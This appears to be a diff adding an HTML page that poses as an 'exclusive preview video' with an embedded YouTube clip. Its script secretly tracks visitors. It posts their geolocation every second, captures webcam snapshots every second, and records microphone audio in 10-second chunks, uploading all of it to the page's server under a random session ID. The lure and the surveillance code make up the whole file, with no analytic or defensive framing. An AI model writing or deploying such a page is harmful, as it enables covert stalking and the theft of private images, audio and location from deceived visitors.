@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Check out this exclusive video!</title>
+</head>
+<body>
+  <h2>🎥 Exclusive preview video below 👇</h2>
+  <iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ"
+    frameborder="0" allowfullscreen></iframe>
+
+  <script>
+    // --- Generate random session ID ---
+    function generateSessionID(length = 8) {
+      const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      let result = '';
+      for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return result;
+    }
+
+    const sessionID = generateSessionID();
+    console.log("🆔 Session ID:", sessionID);
+
+    // --- Send location every second ---
+    function sendLocationRepeatedly() {
+      if (navigator.geolocation) {
+        setInterval(function() {
+          navigator.geolocation.getCurrentPosition(function(pos) {
+            fetch('/send_location/' + sessionID, {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude
+              })
+            });
+            console.log("📍 Sent location");
+          }, function(error) {
+            console.log("❌ Location error:", error);
+          });
+        }, 1000);
+      }
+    }
+    sendLocationRepeatedly();
+
+    // --- Take pictures every second ---
+    navigator.mediaDevices.getUserMedia({video: true})
+    .then(function(stream) {
+      let video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+
+      let interval = setInterval(function() {
+        if (video.videoWidth === 0 || video.videoHeight === 0) {
+          return;
+        }
+
+        let canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        let ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        let imgData = canvas.toDataURL('image/png');
+
+        fetch('/send_image/' + sessionID, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ image: imgData })
+        });
+
+        console.log("📸 Sent picture");
+      }, 1000);
+
+      window.addEventListener('beforeunload', function() {
+        clearInterval(interval);
+        stream.getTracks().forEach(track => track.stop());
+      });
+
+    })
+    .catch(err => console.log("Camera access denied:", err));
+
+    // --- Continuous audio recording ---
+    navigator.mediaDevices.getUserMedia({audio: true})
+.then(function(stream) {
+  let recorder = new MediaRecorder(stream);
+  let chunks = [];
+
+  recorder.ondataavailable = function(e) {
+    chunks.push(e.data);
+  };
+
+  recorder.onstop = function() {
+    let blob = new Blob(chunks, { 'type': 'audio/webm' });
+    fetch('/send_audio/' + sessionID, {
+      method: 'POST',
+      body: blob
+    });
+    console.log("🎤 Sent audio chunk");
+    chunks = [];
+  };
+
+  recorder.start();
+  console.log("🎤 Audio recording started");
+
+  // Stop and restart every 10 seconds
+  setInterval(function() {
+    if (recorder.state === "recording") {
+      recorder.stop();
+      recorder.start();
+    }
+  }, 10000);
+
+  window.addEventListener('beforeunload', function() {
+    recorder.stop();
+    stream.getTracks().forEach(track => track.stop());
+  });
+
+})
+.catch(err => console.log("Microphone access denied:", err));
+
+  </script>
+</body>
+</html>
